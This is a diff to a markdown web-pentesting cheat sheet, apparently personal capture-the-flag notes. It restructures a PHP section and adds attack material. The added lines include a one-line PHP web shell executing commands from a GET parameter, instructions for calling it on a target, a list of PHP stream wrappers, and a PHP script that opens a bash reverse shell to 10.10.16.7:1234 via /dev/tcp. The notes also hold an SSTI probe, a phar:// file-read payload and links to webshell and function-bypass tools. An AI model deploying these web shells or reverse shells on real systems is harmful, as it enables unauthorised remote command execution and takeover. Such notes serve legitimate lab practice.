@@ -17,16 +17,15 @@
 - [Wordpres](#wordpres)
 - [API](#api)
 - [Git Enumeration](#git-enumeration)
-- [PHP psy shell](#php-psy-shell)
-- [PHP exec](#php-exec)
+- [PHP](#php)
+  - [PHP psy shell](#php-psy-shell)
+  - [PHP exec](#php-exec)
 
 
 ## Headers
 - [Modify headers](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/)
-- Reading functions:
-  - https://github.com/teambi0s/dfunc-bypasser
-- Reading php files
-  - ?page=phar://path/to/file
+
+
 
 ## Server Side Template Injection
 {{7x7}}
@@ -248,7 +247,13 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
   - Read files: 
     - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 
-## PHP psy shell
+
+
+## PHP
+- Reading php files
+  - ?page=phar://path/to/file
+
+### PHP psy shell
 - Check folders
 scandir("/")
 - Check files
@@ -259,11 +264,47 @@ file_put_content("path/to/file", "content", FILE_APPEND)
 phpinfo()
 ls
 
-## PHP exec
+### PHP exec
 - [Very good](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
 - upload file/code back.php
+
+- Reading functions:
+  - https://github.com/teambi0s/dfunc-bypasser
+
 ```
+<?php phpinfo(); ?>
+
 <?php echo shell_exec($_GET['c']);?>
 ```
 - In browser: http://$target//back.php?c=dir
   - http://$target//back.php?c=[Create a shell from here](https://www.revshells.com/)
+
+- wrappers:
+```
+file:// — Accessing local filesystem
+http:// — Accessing HTTP(s) URLs
+ftp:// — Accessing FTP(s) URLs
+php:// — Accessing various I/O streams
+zlib:// — Compression Streams
+data:// — Data (RFC 2397)
+glob:// — Find pathnames matching pattern
+phar:// — PHP Archive
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — Audio streams
+expect:// — Process Interaction Streams
+
+<?php
+$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'";
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes, null,null);
+
+?> 
+```
